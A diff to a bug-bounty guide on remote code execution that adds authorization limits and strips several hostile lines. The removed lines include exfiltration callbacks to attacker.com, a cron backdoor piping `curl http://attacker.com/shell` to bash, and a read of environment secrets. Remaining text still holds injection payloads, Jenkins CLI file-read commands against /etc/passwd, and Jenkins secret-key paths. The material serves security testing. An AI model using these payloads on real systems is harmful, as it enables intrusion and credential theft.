@@ -14,7 +14,7 @@ compatibility: Requires explicit written authorization for a target scope plus t
   relevant testing tools for this technique. Docs-only; helper scripts and commands
   not bundled.
 sources: github, hackerone_public
-report_count: 87
+report_count: 87  # imported metadata; not independently verified
 ---
 > **⚠️ AUTHORIZED USE ONLY**
 > This skill is for educational purposes or authorized security assessments only.
@@ -34,9 +34,9 @@ report_count: 87
 
 **Content-type is the #1 silent failure mode for command injection.**
 
-Traditional web forms use `Content-Type: application/x-www-form-urlencoded`. If you send a JSON body (`{"host":"127.0.0.1;id"}`) to a form endpoint, the server reads `request.form['host']` and gets nothing — the app executes normally with no injection, returning a plausible 200 response. You get a false negative with no indication anything went wrong.
+Traditional web forms use `Content-Type: application/x-www-form-urlencoded`. If you send a JSON body (`{"host":"127.0.0.1;id"}`) to a form endpoint, the server reads `request.form['host']` and gets nothing — the app executes normally with no injection, potentially returning a plausible 200 response. You get a false negative with no indication anything went wrong.
 
-**Rule:** If the page has an HTML form (`<form method="POST">`), use form-encoding. If the path is `/api/...` or the response is JSON, use JSON.
+**Rule:** Capture the legitimate request and preserve its actual encoding, method and CSRF/auth context. URL names and response JSON do not establish the accepted request content type.
 
 **Command injection operators to try (in order of prevalence):**
 ```
@@ -47,11 +47,13 @@ value$(id)      ← subshell
 value`id`       ← backtick
 ```
 
-**Proof:** OS command output (`uid=N(username) gid=...`) in the response body confirms code execution. The output may be HTML-wrapped — that still counts. If the response is otherwise normal (200, expected content) with the command output appended or embedded, exploitation is confirmed.
+**Candidate evidence:** Unexpected OS command output (`uid=N(username) gid=...`) in the response body confirms code execution. The output may be HTML-wrapped — that still counts. If the response is otherwise normal (200, expected content) with the command output appended or embedded, use a unique non-sensitive marker and a control request to rule out reflection, static text or a scanner intermediary.
 
 ---
 
-## Crown Jewel Targets
+## Candidate High-Impact Surfaces
+
+Imported payout, report-count and historical case assertions are not verified guarantees. Assess actual permissions and prerequisites; banners, configuration strings, and frontend JS are leads, not server RCE proof. Browser JavaScript execution is a different boundary.
 
 RCE vulnerabilities command the highest payouts in bug bounty programs because they grant attackers direct execution control over target infrastructure. The highest-value targets are:
 
@@ -128,19 +130,19 @@ window.location = userControlled  // URL scheme bypass → JS execution
 4. **Test YAML/XML/serialized input for code execution.** Any endpoint accepting `Content-Type: application/yaml` or `application/xml`:
    - SnakeYAML: submit `!!javax.script.ScriptEngineManager` gadget
    - Ruby YAML: submit `!ruby/object:Gem::Installer` gadget
-   - REXML: submit billion-laughs / quadratic blowup XML
+   - REXML: do not use resource-exhaustion XML on live systems; use a bounded lab reproduction
 
-5. **Hunt dependency confusion.** For every npm/pip/gem internal package name visible in JS bundles, error messages, or `package.json` in public repos — register a higher-versioned package on the public registry pointing to a canary callback.
+5. **Hunt dependency confusion.** For every npm/pip/gem internal package name visible in JS bundles, error messages, or `package.json` in public repos — do not register target package names or publish install hooks without explicit supply-chain testing authorization. Prefer an isolated registry/build reproduction.
 
-6. **Check file path operations for traversal → execution.** ActiveStorage, file upload handlers, symlink operations: submit `../../../etc/cron.d/shell` as filename. Confirm write then trigger execution.
+6. **Check file path operations for traversal → execution.** ActiveStorage, file upload handlers, symlink operations: use an agreed disposable canary path; do not write cron entries or persistence. Execution testing requires a separately authorized controlled plan.
 
-7. **Audit Kubernetes/cloud-native surfaces.** Run `kubectl` against any exposed API server. Check ingress annotations, especially `nginx.ingress.kubernetes.io/configuration-snippet` and `spec.rules.http.paths.path` for Lua/regex injection.
+7. **Audit Kubernetes/cloud-native surfaces.** Use only the explicitly scoped API server and assigned test identity. Public reachability does not authorize access. Check ingress annotations, especially `nginx.ingress.kubernetes.io/configuration-snippet` and `spec.rules.http.paths.path` for Lua/regex injection.
 
 8. **Test OAuth redirect URI and URL scheme handlers.** Mobile apps processing `javascript:` or `intent://` URIs via OAuth redirect may execute JavaScript. Try `javascript:alert(document.cookie)` and custom scheme URIs.
 
-9. **Verify with out-of-band callbacks.** Never rely solely on visible output. Use Burp Collaborator, interactsh, or `canarytokens.org` DNS tokens. Blind RCE is common in backend processors.
+9. **Verify with out-of-band callbacks.** Use independent evidence when needed; an OOB callback alone can be SSRF rather than command execution. Use Burp Collaborator, interactsh, or `canarytokens.org` DNS tokens. Blind RCE is common in backend processors.
 
-10. **Chain privileges.** A low-severity misconfiguration (editor role, CSRF, path traversal) combined with an RCE primitive equals critical. Always ask: "what can I reach from here?"
+10. **Chain privileges.** A low-severity misconfiguration (editor role, CSRF, path traversal) combined with an RCE primitive equals critical. Do not pivot or escalate beyond authorized boundaries; stop after sufficient minimal proof.
 
 ---
 
@@ -162,7 +164,7 @@ window.location = userControlled  // URL scheme bypass → JS execution
 
 ### Apache HTTP Server alias path traversal (CVE-2021-41773 / CVE-2021-42013)
 
-Path normalization bug in Apache 2.4.49 (and the 2.4.50 patch-bypass) lets an attacker escape DocumentRoot via dot-encoded segments **through configured alias paths**. The same primitive yields very different impact depending on which alias accepts the traversal:
+Path normalization bug in Apache 2.4.49 (and the 2.4.50 patch-bypass) lets an attacker escape DocumentRoot via dot-encoded segments **through configured alias paths**. Directory access controls and CGI configuration are additional prerequisites; banners alone cannot establish patch state. The same primitive yields different impact depending on the configured alias:
 
 - Alias without `Options +ExecCGI` (e.g. `/icons/`) → arbitrary file read only
 - Alias with `Options +ExecCGI` (e.g. `/cgi-bin/`) → arbitrary code execution
@@ -191,7 +193,7 @@ curl --path-as-is -X POST \
 
 ### Spring Cloud Function SpEL injection (CVE-2022-22963)
 
-Spring Cloud Function ≤ 3.2.2 (and ≤ 3.1.6) evaluates the `spring.cloud.function.routing-expression` header as a SpEL expression on the `/functionRouter` endpoint without auth, before any routing logic. Wide deployment in AWS Lambda + Cloud Run + on-prem function platforms. Often exposed externally because `/functionRouter` auto-registers and devs don't add an explicit gate.
+Spring Cloud Function 3.1.6, 3.2.2 and older unsupported versions evaluates the `spring.cloud.function.routing-expression` header as a SpEL expression on the `/functionRouter` endpoint without auth, before any routing logic. Wide deployment in AWS Lambda + Cloud Run + on-prem function platforms. Often exposed externally because `/functionRouter` auto-registers and devs don't add an explicit gate.
 
 **Detection:**
 - Spring-style port 8080 with `/uppercase`, `/lowercase`, or arbitrary single-word function endpoints responding 200
@@ -242,30 +244,21 @@ npm view @target-company/internal-package version 2>/dev/null
 
 ### Kubernetes Exposed API Check
 ```bash
-curl -sk https://TARGET:6443/api/v1/namespaces/default/pods \
-  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
-kubectl --insecure-skip-tls-verify -s https://TARGET:6443 get pods --all-namespaces
+kubectl --context APPROVED_TEST_CONTEXT auth can-i list pods --namespace APPROVED_NAMESPACE
+# Keep TLS verification enabled and use the assigned test identity, not an ambient workload token.
 ```
 
-### Out-of-Band RCE Confirmation
-```bash
-# Payload to confirm blind RCE via DNS
-curl "http://$(id | base64).YOUR-INTERACTSH-URL/"
-nslookup $(whoami).attacker.com
-wget http://attacker.com/$(cat /etc/hostname)
-```
+### Out-of-Band and File-Write Evidence
 
-### ActiveStorage Path Traversal → RCE
-```
-# Filename in upload request
-filename="../../../../etc/cron.d/backdoor"
-# Cron payload content
-* * * * * root curl http://attacker.com/shell | bash <!-- security-allowlist: curl-pipe-bash -->
-```
+Use a unique fixed canary at an approved controlled endpoint; never encode `id`,
+hostnames, credentials or file contents in DNS/HTTP callbacks. Correlate request,
+timestamp and target logs: a callback alone does not distinguish SSRF from RCE.
+File-write testing must use an agreed disposable path and cleanup plan; cron,
+webshell and persistence payloads are excluded from the default workflow.
 
 ### Args4j `@`-prefix file expansion (Jenkins CVE-2024-23897 family)
 
-Java CLIs built on the `args4j` library default to `expandAtFiles=true`, which expands `@filename` arguments by reading the file and treating each line as a separate command argument. When such a CLI is exposed over HTTP (Jenkins CLI is the canonical case), the server-side error message echoes failed arguments back — turning argument echoing into an arbitrary file-read primitive. Unauthenticated when "anonymous read access" is on (Jenkins default for fresh installs).
+Java CLIs built on the `args4j` library default to `expandAtFiles=true`, which expands `@filename` arguments by reading the file and treating each line as a separate command argument. When such a CLI is exposed over HTTP (Jenkins CLI is the canonical case), the server-side error message echoes failed arguments back — turning argument echoing into an arbitrary file-read primitive. Jenkins 2.441/LTS 2.426.2 and earlier are affected; fixed in 2.442/LTS 2.426.3/2.440.1. Overall/Read permits full-file reads; without it only limited lines may be exposed, depending on available commands. Do not assume anonymous permissions.
 
 **Detection:**
 - Target exposes `/cli` and `/jnlpJars/jenkins-cli.jar` (Jenkins family)
@@ -284,11 +277,10 @@ java -jar jenkins-cli.jar -s http://target:8080/ -http help 1 @/etc/passwd
 java -jar jenkins-cli.jar -s http://target:8080/ -http connect-node @/etc/passwd
 # → All passwd lines echoed back
 
-# Recon: env vars + JENKINS_HOME path
-java -jar jenkins-cli.jar -s http://target:8080/ -http help 1 @/proc/self/environ
+# Use a prepared non-sensitive canary file; do not read environment secrets.
 ```
 
-**Crown-jewel files after JENKINS_HOME confirmed:**
+**Sensitive paths for defensive exposure review only (do not retrieve in routine validation):**
 - `/var/jenkins_home/secret.key` — master encryption key for stored credentials
 - `/var/jenkins_home/secrets/master.key` — derives the encryption key
 - `/var/jenkins_home/credentials.xml` — credential store (encrypted with secret.key — pair with offline decrypt tools)
@@ -330,7 +322,7 @@ Go's `text/template`, Freemarker, Velocity, and Twig are used for system configu
 Internal packages published to private registries without locking the public registry namespace. Build systems that prefer public registries by default, or that fall through to public when the private registry lacks a package.
 
 **4. Unsafe deserialization of YAML/XML**
-Developers use `YAML.load()` without safe loaders, or `new Yaml()` (SnakeYAML) without type restrictions. Ruby's `YAML.load` and Java's SnakeYAML both support arbitrary object instantiation by default.
+Developers use `YAML.load()` without safe loaders, or `new Yaml()` (SnakeYAML) without type restrictions. Ruby's `YAML.load` and Java's SnakeYAML have version- and API-dependent safe-loading behavior; verify the actual parser and constructor configuration.
 
 **5. Path traversal in file operation chains**
 Filenames accepted from user input are used in filesystem operations without normalization. Rails ActiveStorage, file upload handlers, and rdoc generators trust the `filename` parameter.
